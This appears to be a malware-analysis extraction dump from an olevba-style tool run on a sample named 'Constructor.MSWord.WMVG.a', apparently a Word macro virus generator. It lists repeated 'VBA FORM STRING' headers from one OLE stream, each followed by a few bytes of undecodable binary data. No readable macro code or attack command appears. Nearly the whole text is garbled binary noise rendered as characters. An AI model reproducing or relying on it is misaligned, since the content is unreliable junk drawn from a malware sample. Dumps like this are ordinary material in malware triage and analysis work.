VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J�+�-�+�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;S��R3�ʹ�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�چ�zt�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.kX��A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�0�A��J�"(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|r^.�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D���
)v�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7ú�2��R Wo�&�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d)6���@Mv9 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kRW'��"�Mm
P�OO�|�`J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Jo�����@�+���/�)���m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����N�1�)M(��GJ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6.��.j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�.�L#\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gِ}����H>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǣ���h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ĹP>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K8=)#h�^|؆
�Y�$u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��1-��K�����2 �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$˽J�S�QN��nR}����lo��7�ZrH��C{���o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�_c�_�ʱ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�eE8�Emꕩ�WbEV_
2[�R�><
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%y�!f�T)�Z������IO�u+�4ɮ���HA�����툈$3�	4�5)�ݡ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�rMz��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X)Jt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wp�X��)Rk���OӒ"�J�������ef$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�첲Z$�t�e��H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%O-��kS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�l�;�pr
)��̰<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j3誚���5UA,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�sP�XԭA޵���Du`dU�Qӣ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)���I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*�����E�ᓢK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&�w~��\ܪ��	��G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a"T-u8Z��k��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Hn�����?g��C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���虔�f��ν�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e��$"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T���֏�+8Vi�T� <��6�pc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ɸ�_͒䂗7��u֓ZI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZS�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)\��U�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n�X�_��I<�;�b�?�Z�bY�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�T<�d��e�T7������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?g�\[�[�"Y��'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mk�]���wR�R�Ry?ҧ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�k�f+X��-RΆ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���"�v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T<�rȱ��J�<U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�QA�䐴�N��B���m,�`4���O�g�dFa�W���Uщ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M?S�	���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�[�,V���W"�Eְ���G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�Zt�ı¨i.m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;b��x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�h���%hj2����iZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�Y��aJW���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*+Z֧��hE[jk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CP�T�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;d��M%�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6�T7��׾
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�VO�\����@x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���+�&A�zx�w 
�6�E�|�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�6`J���RƧ�z�ZwezM+�Q��"b���΀��֙
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+!�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��WR<0RZ�X�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zא�2!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�) ��ֵ�;e�,8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8<5�S����n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IN�%)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��5�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ի
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�1e�E�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tZ5�s�)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F')�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�4P�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ă��a7��F��\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��"��>Y���
)�I�B�#�2	A��#(8��yxd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R;���cJ��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1C:�~��<(E�[T��=�2)M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p<�<I�FWĚQ{(���A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 o�y
�5n$֟����sk�]qn鱡'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%hk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-*qW����z'����?�8�������G�N_�Lv��<�_3~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9r�=h)ï>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�|rr�����>��^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c�Q�O�6�_�zS��?o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nY�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R���8q��ϐ�����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\-3�d6?V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?FS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�;��iO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rܜ�8��n���Ԗ��.?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҿ�w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�݄����_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��e_���z_��9S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�Wjd��
Y��N����}Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�VA��?S���s����}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kj��3���Nf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5��8���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�|�7ѻ~�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}Z���y}��ֿ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>.�c�_�x�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�9z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӈ.�6��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\}{�l�Ӓw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k���O�ƟF�º82����je�k(y}?��+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�1h)�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�����˝{���O��<���uGD����~��0G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
